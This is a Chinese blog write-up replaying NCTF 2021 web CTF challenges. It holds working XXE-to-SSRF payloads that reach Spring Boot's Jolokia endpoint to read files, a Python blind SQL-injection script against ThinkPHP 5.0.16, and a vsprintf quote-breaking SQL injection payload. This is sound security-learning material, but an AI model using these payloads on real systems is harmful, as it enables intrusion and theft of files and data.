---
title: "NCTF 2021 Web 部分复现"
date: 2022-11-19T14:28:53+08:00
lastmod: 2022-11-19T14:28:53+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

今年 nctf 快要开始了, 做做去年的题

看了 wp 之后发现自己对前端安全还是不太熟, 太菜了呜呜

<!--more-->

## X1cT34m_API_System

题目是一个 springboot 网站, 实现了用户注册和登录等相关逻辑

主页有个链接 link 到 [https://github.com/API-Security/APIKit](https://github.com/API-Security/APIKit)

题目附件如下

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <packaging>jar</packaging>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.0</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.x1ct34m</groupId>
    <artifactId>nctf</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>nctf</name>
    <description>wangyu nmsl</description>
    <properties>
        <java.version>11</java.version>
        <skipTests>true</skipTests>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-jdbc</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
        </dependency>

        <dependency>
            <groupId>io.pebbletemplates</groupId>
            <artifactId>pebble-spring-boot-starter</artifactId>
            <version>3.1.5</version>
        </dependency>

        <dependency>
            <groupId>org.jolokia</groupId>
            <artifactId>jolokia-core</artifactId>
            <version>1.6.0</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-security</artifactId>
        </dependency>

        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.12</version>
        </dependency>
    </dependencies>

    <build>
        <finalName>X1cT34m_API_System</finalName>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <fork>true</fork>
                    <mainClass>com.x1ct34m.nctf.Application</mainClass>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>9</source>
                    <target>9</target>
                </configuration>
            </plugin>
        </plugins>
    </build>

</project>
```

存在 springboot actuator 和 jolokia 两个额外的依赖

相关文章

[https://xz.aliyun.com/t/9763](https://xz.aliyun.com/t/9763)

[https://www.freebuf.com/news/193509.html](https://www.freebuf.com/news/193509.html)

访问 /actuator 发现存在未授权

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181436285.png)

APIKit

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181436174.png)

注意 /user/list 和 /actuator/jolokia, 前者在访问页面的时候没遇到过, 应该是隐藏接口, 后者就是 jolokia 的接口

访问 /user/list 提示 405, 改成 post 返回 `<id></id><username></username>` ,猜测有 xxe

测试发现不能读文件, 也不能用 `ENTIY %` 这种形式的 payload, 但题目出网 (之后看 wp 发现是配置错误, 应该是不出网的)

访问 /actuator/jolokia 提示 403

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181440517.png)

用 xxe + ssrf 打一下, 注意是 docker 环境, 内部端口要从 /actuator/env 获取

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181445598.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181441431.png)

之后就是寻找 jolokia 的利用方式, 网上的 rce 在这里不适用 (预期环境不出网)

翻了翻官方文档, 发现可以列举和查找 mbean

[http://huazx.github.io/Jolokia/reference/protocol.html](http://huazx.github.io/Jolokia/reference/protocol.html)

用 list 报错 (存在 `<>` 字符, xml 解析错误), 换成 search

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE id [
<!ENTITY file SYSTEM "http://127.0.0.1:8080/actuator/jolokia/search/*:*">]>
<id>&file;
</id>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181446717.png)

```json
["jolokia:type=Config",
 "org.springframework.boot:name=Configprops,
type=Endpoint",
 "org.springframework.boot:name=Conditions,
type=Endpoint",
 "JMImplementation:type=MBeanServerDelegate",
 "java.lang:type=Runtime",
 "java.lang:type=Threading",
 "java.lang:type=OperatingSystem",
 "java.nio:name=direct,
type=BufferPool",
 "org.springframework.boot:name=Scheduledtasks,
type=Endpoint",
 "java.lang:type=Compilation",
 "org.springframework.boot:name=Mappings,
type=Endpoint",
 "org.springframework.boot:name=Threaddump,
type=Endpoint",
 "java.lang:name=G1 Young Generation,
type=GarbageCollector",
 "java.lang:name=CodeCacheManager,
type=MemoryManager",
 "java.lang:name=G1 Old Gen,
type=MemoryPool",
 "java.util.logging:type=Logging",
 "java.lang:name=G1 Old Generation,
type=GarbageCollector",
 "java.lang:type=ClassLoading",
 "java.lang:name=Metaspace Manager,
type=MemoryManager",
 "java.lang:name=G1 Survivor Space,
type=MemoryPool",
 "org.springframework.boot:name=Caches,
type=Endpoint",
 "jolokia:type=Discovery",
 "java.lang:name=Metaspace,
type=MemoryPool",
 "java.lang:name=CodeHeap 'profiled nmethods',
type=MemoryPool",
 "org.springframework.boot:name=Beans,
type=Endpoint",
 "org.springframework.boot:name=Loggers,
type=Endpoint",
 "jmx4perl:type=Config",
 "org.springframework.boot:name=Env,
type=Endpoint",
 "java.lang:name=CodeHeap 'non-nmethods',
type=MemoryPool",
 "jolokia:type=ServerHandler",
 "java.lang:name=Compressed Class Space,
type=MemoryPool",
 "java.lang:type=Memory",
 "java.lang:name=G1 Eden Space,
type=MemoryPool",
 "java.nio:name=mapped,
type=BufferPool",
 "org.springframework.boot:name=Metrics,
type=Endpoint",
 "org.springframework.boot:name=Info,
type=Endpoint",
 "org.springframework.boot:name=SpringApplication,
type=Admin",
 "com.sun.management:type=DiagnosticCommand",
 "com.zaxxer.hikari:name=dataSource,
type=HikariDataSource",
 "org.springframework.boot:name=Health,
type=Endpoint",
 "java.lang:name=CodeHeap 'non-profiled nmethods',
type=MemoryPool",
 "com.sun.management:type=HotSpotDiagnostic",
 "jdk.management.jfr:type=FlightRecorder"]
```

看到了 `java.lang:type=Runtime` , 结果不能执行命令

猜测 `com.sun.management:type=DiagnosticCommand` 或许也能够执行命令? 于是发现这篇文章

[https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/](https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/)

其实是利用 `DiagnosticCommand` 来读文件

最终 payload

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE id [
<!ENTITY file SYSTEM "http://127.0.0.1:8080/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/flag">]>
<id>&file;
</id>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211181449181.png)

## baibaibai_2.0

www.zip 源码泄露, thinkphp v5.0.16

/application/index/controller/M1sakaM1yuu.php

```php
<?php 
/*
 * @Author: m1saka@x1ct34m
 * @blog: www.m1saka.love
 */

namespace app\index\controller;
function waf($str){
	if(preg_match("/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i", $str)){
		return true;
	}
}
class M1sakaM1yuu
{
	public function index()
	{
		$username = request()->get('username/a');
		$str = implode(',',$username);
		if (waf($str)) {
			return '<img src="http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg" alt="hutao" />';
		}
		if($username){
			db('m1saka')->insert(['username' => $username]);
			return '啊对对对';
		}
		else {
			return '说什么我就开摆';//
		}
	}
}
```

直接访问 `/public/?s=index/M1sakaM1yuu/index` 会提示错误, 原因如下

[https://blog.csdn.net/zzh_meng520/article/details/55096901](https://blog.csdn.net/zzh_meng520/article/details/55096901)

得改成 `/public/?s=index/m1saka_m1yuu/index`

然后搜了下相关 sql 注入 [https://xz.aliyun.com/t/9266](https://xz.aliyun.com/t/9266)

但是涉及的版本只有 `5.0.13<=ThinkPHP<=5.0.15`

不过经过测试发现当 `$val[0]` 为 exp 时也能够成功注入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191046777.png)

构造 payload, 这里的时间注入可以改成 bigint 溢出

```python
import requests
import time

flag = ''

for i in range(1, 99999):
    for s in range(32,128):
        payload = 'if(ascii(substr((select%0aload_file("/var/www/html/ffllaagg.php")),{},1))={},1,1%2B~0)'.format(i, s)
        url = 'http://192.168.100.1:8086/public/?s=index/m1saka_m1yuu/index&username[0]=exp&username[1]={}&username[2]=1'.format(payload)
        #print(chr(s))
        res = requests.get(url)
        if '啊对对对' in res.text:
            flag += chr(s)
            print('FOUND!!!',flag)
            break
```

源码里面提示了 flag 的路径, 直接读文件就行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191047782.png)

## ezsql

题目没环境, 就简单说一下吧

参考文章 [https://www.creastery.com/blog/hack.lu-ctf-2021-web-challenges/](https://www.creastery.com/blog/hack.lu-ctf-2021-web-challenges/)

login.php

```php
<?php
if (isset($_POST['password'])){
    $query = db::prepare("SELECT * FROM `users` where password=md5(%s)", $_POST['password']);

    if (isset($_POST['name'])){
        $query = db::prepare($query . " and name=%s", $_POST['name']);
    }
    else{
        $query = $query . " and name='benjaminEngel'";
    }
    $query = $query . " limit 1";

    $result = db::commit($query);

    if ($result->num_rows > 0){
        die('NCTF{ez');
    }
    else{
        die('Wrong name or password.');
    }
}
```

DB.php

```php
<?php

class DB{
    private static $db = null;

    public function __construct($db_host, $db_user, $db_pass, $db_database){
        static::$db = new mysqli($db_host, $db_user, $db_pass, $db_database);
    }


    static public function buildMySQL($db_host, $db_user, $db_pass, $db_database)
    {
        return new DB($db_host, $db_user, $db_pass, $db_database);
    }

    public static function getInstance(){
        return static::$db;
    }

    public static function connect_error(){
        return static::$db->connect_errno;
    }

    public static function prepare($query, $args){
        if (is_null($query)){
            return;
        }
        if (strpos($query, '%') === false){
            die('%s not included in query!');
            return;
        }

        // get args
        $args = func_get_args();
        array_shift( $args );

        $args_is_array = false;
        if (is_array($args[0]) && count($args) == 1 ) {
            $args = $args[0];
            $args_is_array = true;
        }

        $count_format = substr_count($query, '%s');

        if($count_format !== count($args)){
            die('Wrong number of arguments!');
            return;
        }
        // escape
        foreach ($args as &$value){
            $value = static::$db->real_escape_string($value);
        }

        // prepare
        $query = str_replace("%s", "'%s'", $query);
        $query = vsprintf($query, $args);
        return $query;

    }
    public static function commit($query){
        $res = static::$db->query($query);
        if($res !== false){ 
                return $res;
            }
            else{
                die('Error in query.');
        }
    }
}
?>
```

prepare 方法会将 `%s` 替换成 `'%s'` , 然后用 vsprintf 将 `$args` 数组的内容依次填充到 `%s` 中

因为 login.php 中调用了两次 prepare, 所以在替换的过程中可以闭合引号 (不能直接闭合, 因为有 `real_escape_string`)

思路是先往 password 中传入 `%s`

```sql
SELECT * FROM `users` where password=md5(%s)

SELECT * FROM `users` where password=md5('%s') # 在 %s 两边加上单引号

SELECT * FROM `users` where password=md5('%s') # 将 %s 填充为 %s (没变)
```

这时候当第二次调用 prepare 填充 name 的时候就会出现问题

因为 vsprintf 接收的就是数组参数, 所以下面传一个 name 数组, 例如 `name[0]=123&name[1]=456`

```sql
SELECT * FROM `users` where password=md5('%s') and name=%s

SELECT * FROM `users` where password=md5(''%s'') and name='%s' # 在 %s 两边加上单引号

SELECT * FROM `users` where password=md5(''123'') and name='456' # 将 name 数组的内容填充到 %s
```

到最后一句会发现 123 前面的引号已经闭合了, 所以构造 payload 如下

```
password=%s&name[0]=) or 1=1 #&name[1]=123
```

sql 语句变为

```sql
SELECT * FROM `users` where password=md5('') or 1=1 # '') and name='123'
```

注入脚本就不写了

## ezjava prettyjs prettynote

ez java 附件没找到

prettyjs prettynote 的环境一直没搞好, 头大...

官方 wp: [https://ctf.njupt.edu.cn/archives/727](https://ctf.njupt.edu.cn/archives/727)

prettyjs: [https://v2tn.com/content/1642035946295424](https://v2tn.com/content/1642035946295424)

prettynote: [https://v2tn.com/content/1642381541039264](https://v2tn.com/content/1642381541039264)
